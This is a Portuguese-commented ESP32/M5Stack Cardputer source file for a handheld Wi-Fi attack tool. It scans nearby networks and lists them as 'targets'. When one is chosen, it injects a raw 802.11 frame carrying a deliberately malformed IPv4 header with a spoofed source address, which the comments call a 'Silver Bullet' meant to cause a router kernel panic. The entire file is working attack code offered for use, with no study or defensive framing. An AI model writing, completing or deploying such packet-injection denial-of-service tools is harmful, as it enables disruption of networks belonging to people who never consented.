#include <M5Unified.h>
#include <esp_wifi.h>
#include <esp_system.h>
#include <nvs_flash.h>
#include <string.h>

// -------------------------------------------------------------------
// 1. ESTRUTURAS DO PACOTE (A Bala)
// -------------------------------------------------------------------
struct __attribute__((packed)) MacHeader {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  mac_dest[6];   
    uint8_t  mac_src[6];    
    uint8_t  mac_bssid[6];  
    uint16_t seq_ctrl;
};

struct __attribute__((packed)) IpHeader {
    uint8_t  version_ihl;   
    uint8_t  tos;
    uint16_t total_length;
    uint16_t id;
    uint16_t frag_off;      
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t checksum;
    uint8_t  ip_src[4];     
    uint8_t  ip_dest[4];    
};

struct __attribute__((packed)) SilverBulletPacket {
    MacHeader mac;
    IpHeader ip;
    uint8_t payload[32];    
};

// -------------------------------------------------------------------
// 2. VARIÁVEIS GLOBAIS DO RADAR
// -------------------------------------------------------------------
#define MAX_ALVOS 10
wifi_ap_record_t alvos_encontrados[MAX_ALVOS];
uint16_t total_alvos = 0;
int alvo_selecionado = 0;

enum EstadoFerramenta {
    ESTADO_ESCANEAR,
    ESTADO_SELECIONAR,
    ESTADO_ATIRAR
};
EstadoFerramenta estado_atual = ESTADO_ESCANEAR;

// -------------------------------------------------------------------
// 3. FUNÇÕES DE ATAQUE E RECONHECIMENTO
// -------------------------------------------------------------------
void escanear_redes() {
    M5.Display.fillScreen(TFT_BLACK);
    M5.Display.setCursor(0, 0);
    M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
    M5.Display.println("A procurar alvos...");

    wifi_scan_config_t scan_config = {
        .ssid = 0, .bssid = 0, .channel = 0, .show_hidden = true
    };
    
    // Inicia o scan ativo (O ESP32-S3 varre os canais de 1 a 13)
    esp_wifi_scan_start(&scan_config, true);
    
    total_alvos = MAX_ALVOS;
    esp_wifi_scan_get_ap_records(&total_alvos, alvos_encontrados);
    
    estado_atual = ESTADO_SELECIONAR;
    alvo_selecionado = 0;
}

void desenhar_menu() {
    M5.Display.fillScreen(TFT_BLACK);
    M5.Display.setCursor(0, 0);
    M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
    M5.Display.println("--- SELECIONAR ALVO ---");

    for (int i = 0; i < total_alvos; i++) {
        if (i == alvo_selecionado) {
            M5.Display.setTextColor(TFT_BLACK, TFT_GREEN); // Destaca o selecionado
            M5.Display.print(" > ");
        } else {
            M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
            M5.Display.print("   ");
        }
        
        // Imprime o SSID e o Canal no ecrã
        M5.Display.printf("%s (CH: %d)\n", alvos_encontrados[i].ssid, alvos_encontrados[i].primary);
    }
    
    M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
    M5.Display.println("\n[UP/DOWN] Navegar | [ENTER] Travar Mira");
}

void disparar_contra_alvo() {
    SilverBulletPacket pkt;
    memset(&pkt, 0, sizeof(SilverBulletPacket));
    
    // 1. AFINAR A MIRA (Canal e MAC corretos do alvo escolhido)
    uint8_t canal_alvo = alvos_encontrados[alvo_selecionado].primary;
    uint8_t* mac_alvo = alvos_encontrados[alvo_selecionado].bssid;
    
    esp_wifi_set_channel(canal_alvo, WIFI_SECOND_CHAN_NONE);
    
    // Prepara o cabeçalho Layer 2
    pkt.mac.frame_control = 0x0008; // Data Frame
    memcpy(pkt.mac.mac_dest, mac_alvo, 6);  // Dispara diretamente para a porta do Router
    memcpy(pkt.mac.mac_bssid, mac_alvo, 6);
    
    // 2. INJETAR A ANOMALIA (O Kernel Panic Layer 3)
    pkt.ip.version_ihl = 0x40; 
    pkt.ip.total_length = 0xFFFF; 
    pkt.ip.ip_src[0] = 1; pkt.ip.ip_src[1] = 2; pkt.ip.ip_src[2] = 3; pkt.ip.ip_src[3] = 4;
    
    // 3. PUXAR O GATILHO
    esp_wifi_80211_tx(WIFI_IF_STA, &pkt, sizeof(SilverBulletPacket), false);
    
    M5.Display.fillScreen(TFT_BLACK);
    M5.Display.setCursor(0, 0);
    M5.Display.setTextColor(TFT_RED, TFT_BLACK);
    M5.Display.printf("ALVO TRAVADO: %s\n", alvos_encontrados[alvo_selecionado].ssid);
    M5.Display.printf("CANAL: %d | MAC: %02X:%02X...\n", canal_alvo, mac_alvo[0], mac_alvo[1]);
    M5.Display.println("\n-> PACOTE INJETADO!");
    M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
    M5.Display.println("\n[ESC] Voltar ao Radar");
}

// -------------------------------------------------------------------
// 4. MÁQUINA DE ESTADOS PRINCIPAL (O Loop)
// -------------------------------------------------------------------
extern "C" void app_main(void) {
    auto cfg = M5.config();
    M5.begin(cfg);
    M5.Display.setRotation(1);
    M5.Display.setTextSize(1.5);
    
    // Inicializa a NVS e o Rádio em modo Estação (Cliente)
    nvs_flash_init();
    esp_netif_init();
    esp_event_loop_create_default();
    wifi_init_config_t wifi_cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&wifi_cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();

    // Começa logo por procurar as redes em redor
    escanear_redes();
    desenhar_menu();

    while (true) {
        M5.update(); // Atualiza a leitura do teclado do Cardputer

        if (estado_atual == ESTADO_SELECIONAR) {
            // Lógica de navegação no menu com o teclado
            if (M5.Keyboard.isKeyPressed(KEY_DOWN) && alvo_selecionado < total_alvos - 1) {
                alvo_selecionado++;
                desenhar_menu();
                vTaskDelay(150 / portTICK_PERIOD_MS); // Debounce da tecla
            }
            if (M5.Keyboard.isKeyPressed(KEY_UP) && alvo_selecionado > 0) {
                alvo_selecionado--;
                desenhar_menu();
                vTaskDelay(150 / portTICK_PERIOD_MS);
            }
            if (M5.Keyboard.isKeyPressed(KEY_ENTER)) {
                estado_atual = ESTADO_ATIRAR;
                // Ativa o modo promíscuo (injeção raw) e dispara
                esp_wifi_set_promiscuous(true);
                disparar_contra_alvo();
            }
        } 
        else if (estado_atual == ESTADO_ATIRAR) {
            // Pressionar ESC (ou a tecla correspondente a retroceder) volta ao radar
            if (M5.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
                esp_wifi_set_promiscuous(false); // Desliga a injeção
                estado_atual = ESTADO_SELECIONAR;
                desenhar_menu();
                vTaskDelay(200 / portTICK_PERIOD_MS);
            }
        }

        vTaskDelay(10 / portTICK_PERIOD_MS); // Respiro para o CPU não congelar
    }
}